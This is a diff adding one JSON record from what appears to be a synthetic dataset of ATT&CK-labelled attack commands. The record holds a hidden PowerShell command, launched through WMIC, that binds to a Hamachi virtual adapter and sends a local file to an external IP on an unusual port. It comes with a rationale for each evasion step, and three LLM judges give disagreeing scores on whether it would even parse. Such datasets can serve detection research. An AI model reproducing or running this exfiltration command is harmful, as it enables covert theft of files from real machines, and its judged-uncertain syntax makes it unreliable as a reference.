@@ -1,0 +1,60 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Hamachi*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.166',59322); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Downloads\\pack.data'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Uses WMIC to start a hidden PowerShell that binds to a Hamachi virtual adapter and exfiltrates data via TCP on an unusual port. A third-party virtual NIC provides an alternate medium in line with T1011.",
+  "rationale_steps": [
+    "Discover the Hamachi virtual NIC using WMI.",
+    "Bind the TCP client to the Hamachi interface to force that egress path.",
+    "Connect to an external server using a high port uncommon in enterprise traffic.",
+    "Stream file bytes through the virtual network medium per T1011.",
+    "Avoid any system-wide routing or adapter changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-0ab0140d",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "The WMIC invocation and quoting are balanced, but pervasive backtick-escaping of PowerShell variables (e.g., `$ifc, `$_) will likely break parsing and cause runtime errors.",
+        "semantic_score": 3,
+        "semantic_justification": "The logic aims to exfiltrate a file via a TCP connection bound to a Hamachi virtual adapter, which aligns with exfiltration over an alternate network medium, but the improper escaping undermines practical execution.",
+        "combined_score": 2.5,
+        "confidence": 0.6,
+        "timestamp": "2025-09-30T23:59:30.394330Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, parentheses, and braces, correct escape sequences, and valid PowerShell syntax throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by identifying a Hamachi virtual network adapter (alternative network medium), binding to it specifically, and using it to exfiltrate data over TCP to an external server on an unusual port.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-09-30T23:59:33.010542Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 2,
+        "syntactic_justification": "The PowerShell command uses backticks to escape dollar signs (e.g., `$`ifc instead of $ifc) for variable references, which results in invalid PowerShell syntax and will cause parsing errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by explicitly binding to a Hamachi virtual adapter's IP to force data exfiltration over an alternate network medium, using a hidden PowerShell process and an unusual TCP port, all operationally plausible under user privileges.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T00:00:06.322402Z"
+      }
+    ],
+    "llm_average_syntactic": 3.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
